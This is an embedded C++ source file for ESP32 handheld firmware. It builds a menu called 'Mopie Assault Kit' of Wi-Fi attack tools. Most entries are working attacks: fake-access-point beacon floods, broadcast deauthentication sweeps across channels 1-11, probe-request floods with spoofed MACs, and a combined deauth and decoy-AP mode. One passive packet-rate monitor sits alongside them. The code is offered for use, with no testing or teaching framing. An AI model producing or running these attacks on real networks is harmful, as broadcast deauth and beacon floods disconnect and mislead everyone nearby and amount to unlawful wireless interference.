#include "mopie_tools.h"
#include "mopie_tx.h"
#include "sniffer.h"
#include <esp_wifi.h>
#include "core/mykeyboard.h"
#include "core/display.h"
#include "core/main_menu.h"
#include "modules/wifi/mopie_tx.h"
#include <Arduino.h>
#include <globals.h>

// Mopie Assault Kit — a Mopie-branded console distinct from Bruce's option
// lists. Draws a tactical header, then presents each tool as a bracketed row
// with a one-line effect label. Selecting runs the Mopie-owned primitive.

namespace {
void drawKitHeader(int sel, int count) {
    tft.fillScreen(bruceConfig.bgColor);
    tft.fillRect(0, 0, tftWidth, 12, bruceConfig.priColor);
    tft.setTextColor(TFT_BLACK, bruceConfig.priColor);
    tft.drawCentreString("MOPIE ASSAULT KIT", tftWidth / 2, 2, 1);
    tft.setTextColor(bruceConfig.secColor, bruceConfig.bgColor);
    tft.drawString("[" + String(sel + 1) + "/" + String(count) + "]", 4, tftHeight - 10, 1);
}
}  // namespace

void mopieAssaultKit() {
    struct KitTool { const char *name; const char *effect; void (*fn)(); };

    // M5StickC Plus: 520KB RAM. Warn early if heap is too tight for the heavy
    // sweep tools (each opens promiscuous TX) — better than a watchdog reboot.
    if (ESP.getFreeHeap() < 60000) {
        tft.fillScreen(bruceConfig.bgColor);
        tft.setTextColor(TFT_RED, bruceConfig.bgColor);
        tft.drawCentreString("LOW HEAP: " + String(ESP.getFreeHeap()) + " B", tftWidth / 2, 24, 1);
        tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
        tft.drawCentreString("Risk of watchdog reboot", tftWidth / 2, 44, 1);
        tft.drawCentreString("PWR to back out", tftWidth / 2, 66, 1);
        unsigned long t0 = millis();
        while (!check(EscPress) && millis() - t0 < 2500) vTaskDelay(20);
        if (!check(EscPress)) { /* let them proceed if they hold */ }
    }

    KitTool tools[] = {
        {"SSID Blast",   "fake AP beacon flood",     []() {
            // reuse the in-menu SSID Blast body: own beacon engine, rotating funny SSIDs
            static const char *funny[] = {"FREE_WIFI_5G","FBI_VAN","Skynet_Backup","NSA_Truck","Dont_Connect"};
            const int N = sizeof(funny)/sizeof(funny[0]);
            uint8_t bssid[6] = {0x02,0,0,0,0,0};
            tft.fillScreen(bruceConfig.bgColor);
            tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
            tft.drawCentreString("SSID Blast running", tftWidth/2, 20, 1);
            unsigned long t0 = millis();
            while (!check(EscPress) && millis()-t0 < 10000) {
                for (int f=0; f<N; f++) {
                    uint8_t b[128]; size_t bl = mopie_build_beacon(b, bssid, funny[f]);
                    if (bl) mopie_send_raw(b, bl, 6, 1);
                }
                for (int k=1;k<6;k++) bssid[k]=(uint8_t)random(256);
                vTaskDelay(40);
            }
        }},
        {"Sweep Kick",   "broadcast deauth ch1-11",  []() {
            uint8_t ap[6] = {0x02,0xAA,0xBB,0xCC,0xDD,0xEE};
            mopie_deauth_sweep(ap, "", 10000);
        }},
        {"Probe Flood",  "active-scanner flood",     []() {
            static const char *t[] = {"Corp_WiFi","IoT_Net","CCTV","Nobody_home"};
            const int NT = sizeof(t)/sizeof(t[0]);
            uint8_t src[6] = {0x02,0,0,0,0,0};
            unsigned long t0 = millis();
            while (!check(EscPress) && millis()-t0 < 8000) {
                for (int k=1;k<6;k++) src[k]=(uint8_t)random(256);
                uint8_t p[64]; size_t pl = mopie_build_probe(p, src, t[random(NT)]);
                if (pl) mopie_send_raw(p, pl, 1, 1);
                vTaskDelay(12);
            }
        }},
        {"Deauth Radar",  "channel sweep w/ live bars", []() {
            // Mopie-owned: hop ch1-11 broadcasting deauth, draw a live 11-bar
            // radar (each bar = deauth bursts fired on that channel).
            uint8_t ap[6] = {0x02,0,0,0,0,0}, df[26], bc[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
            mopie_build_deauth(df, ap, bc, 0x0001);
            tft.fillScreen(bruceConfig.bgColor);
            tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
            tft.drawCentreString("DEAUTH RADAR", tftWidth/2, 8, 1);
            tft.drawString("ch:", 4, 22, 1);
            tft.setTextColor(bruceConfig.secColor, bruceConfig.bgColor);
            int counts[12] = {0};
            unsigned long t0 = millis();
            uint8_t ch = 1;
            while (!check(EscPress) && millis()-t0 < 12000) {
                mopie_send_raw(df, sizeof(df), ch, 3);   // burst
                counts[ch]++;
                // spectral bar for current channel
                int h = 26 + (counts[ch] % 40);
                if (h > 72) h = 72;
                tft.fillRect(26 + (ch-1)*17, 70 - h, 14, h, bruceConfig.priColor);
                tft.setTextColor(bruceConfig.secColor, bruceConfig.bgColor);
                tft.drawCentreString(String(ch), 33 + (ch-1)*17, 78, 1);
                ch = (ch % 11) + 1;
                vTaskDelay(55);
            }
        }},
        {"Sweep Beacon",  "deauth + fake-AP decoy", []() {
            // Mopie-owned combo: hop ch1-11, deauth everyone, and beacon a decoy
            // SSID so the zone looks "occupied" by a fake network.
            uint8_t bssid[6] = {0x02,0,0,0,0,0}, bc[6]={0xFF,0xFF,0xFF,0xFF,0xFF,0xFF}, df[26];
            mopie_build_deauth(df, bssid, bc, 0x0001);
            tft.fillScreen(bruceConfig.bgColor);
            tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
            tft.drawCentreString("SWEEP BEACON", tftWidth/2, 12, 1);
            tft.setTextColor(bruceConfig.secColor, bruceConfig.bgColor);
            tft.drawCentreString("deauth + decoy beacon", tftWidth/2, 34, 1);
            unsigned long t0 = millis();
            uint8_t ch = 1;
            uint32_t frames = 0;
            while (!check(EscPress) && millis()-t0 < 10000) {
                frames += (uint32_t)mopie_send_raw(df, sizeof(df), ch, 3);
                uint8_t beacon[128];
                char ssid[16]; snprintf(ssid, sizeof(ssid), "cell-%d", ch);
                size_t bl = mopie_build_beacon(beacon, bssid, ssid);
                if (bl) mopie_send_raw(beacon, bl, ch, 1);
                for (int k=1;k<6;k++) bssid[k]=(uint8_t)random(256);
                ch = (ch % 11) + 1;
                vTaskDelay(60);
            }
            tft.drawCentreString("done: " + String(frames) + " frames", tftWidth/2, 70, 1);
        }},
        {"Sig Monitor",  "live radio activity", []() {
            // Defensive recon: promiscuous capture, live packet-rate + AP count.
            tft.fillScreen(bruceConfig.bgColor);
            tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
            tft.drawCentreString("SIG MONITOR", tftWidth/2, 8, 1);
            esp_wifi_set_promiscuous(true);
            esp_wifi_set_promiscuous_rx_cb(nullptr);   // capture raw only, no pcap
            unsigned long t0 = millis();
            uint32_t last = 0; unsigned long lastT = t0;
            while (!check(EscPress) && millis()-t0 < 8000) {
                unsigned long now = millis();
                if (now - lastT >= 500) {
                    uint32_t pkts = wifiPktCount;
                    uint32_t rate = (pkts - last) * 2;         // per second
                    last = pkts; lastT = now;
                    tft.setTextColor(bruceConfig.secColor, bruceConfig.bgColor);
                    tft.drawCentreString(String(rate) + " pkt/s", tftWidth/2, 34, 1);
                    tft.drawCentreString(String((int)registeredBeacons.size()) + " APs", tftWidth/2, 50, 1);
                    // activity bar
                    int w = (int)((rate % 160) + 8); if (w > 160) w = 160;
                    tft.fillRect((tftWidth-160)/2, 62, w, 10, bruceConfig.priColor);
                }
                vTaskDelay(20);
            }
            esp_wifi_set_promiscuous(false);
            tft.drawCentreString("monitor off", tftWidth/2, 84, 1);
        }},
    };
    const int N = sizeof(tools)/sizeof(tools[0]);
    int sel = 0;
    drawKitHeader(sel, N);
    for (int i = 0; i < N; i++) {
        int y = 20 + i * 24;
        tft.setTextColor(i == sel ? bruceConfig.priColor : bruceConfig.secColor, bruceConfig.bgColor);
        tft.drawString(String(i == sel ? "> " : "  ") + String(tools[i].name), 6, y, 1);
        tft.setTextColor(bruceConfig.secColor, bruceConfig.bgColor);
        tft.drawString(String(tools[i].effect), tftWidth / 2, y, 1);
    }
    tft.setTextColor(bruceConfig.secColor, bruceConfig.bgColor);
    tft.drawCentreString("M5:run  SIDE:up/dn  PWR:back", tftWidth / 2, tftHeight - 2, 1);

    while (!check(EscPress)) {
        if (check(SelPress)) {
            tools[sel].fn();
            drawKitHeader(sel, N);
            for (int i = 0; i < N; i++) {
                int y = 20 + i * 24;
                tft.setTextColor(i == sel ? bruceConfig.priColor : bruceConfig.secColor, bruceConfig.bgColor);
                tft.drawString(String(i == sel ? "> " : "  ") + String(tools[i].name), 6, y, 1);
                tft.setTextColor(bruceConfig.secColor, bruceConfig.bgColor);
                tft.drawString(String(tools[i].effect), tftWidth / 2, y, 1);
            }
        } else if (check(NextPress)) { sel = (sel + 1) % N; drawKitHeader(sel, N); }
        else if (check(PrevPress)) { sel = (sel + N - 1) % N; drawKitHeader(sel, N); }
        vTaskDelay(20);
    }
    tft.fillScreen(bruceConfig.bgColor);
}